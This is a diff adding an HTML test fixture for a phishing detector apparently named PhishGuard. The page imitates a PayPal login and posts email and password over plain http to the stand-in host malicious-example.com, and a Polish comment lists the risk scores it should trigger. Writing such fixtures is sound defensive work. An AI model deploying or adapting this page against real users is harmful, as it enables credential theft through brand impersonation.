@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Secure Login</title>
+  <!-- 
+    OPIS SCENARIUSZA TESTOWEGO (DANGEROUS PHISHING):
+    1. Tytuł strony zawiera słowo kluczowe znanej marki: "PayPal".
+    2. Witryna nie jest hostowana w domenie paypal.com (mismatch marki: +40% kary).
+    3. Formularz zawiera pole wprowadzania hasła (+15% kary).
+    4. Formularz wysyła dane nieszyfrowanym kanałem http:// (insecure action: +30% kary).
+    5. Formularz wysyła hasło na obcy serwer (external action: +35% kary).
+    
+    * Ten plik generuje krytycznie wysoki wskaźnik ryzyka w PhishGuard!
+  -->
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background-color: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 6px;
+      border: 1px solid #dcdcdc;
+      width: 300px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      color: #003087;
+      margin-bottom: 20px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #999;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #0070ba;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Używamy wyłącznie tekstu bez logo i grafik marki -->
+    <h1>PayPal</h1>
+    
+    <!-- Akcja wskazuje na zewnętrzną, niezaszyfrowaną domenę (http) -->
+    <form action="http://malicious-example.com/login" method="POST">
+      <input type="email" class="input-field" placeholder="Email address" required>
+      <input type="password" class="input-field" placeholder="Password" required>
+      <button type="submit" class="btn">Log In</button>
+    </form>
+  </div>
+</body>
+</html>
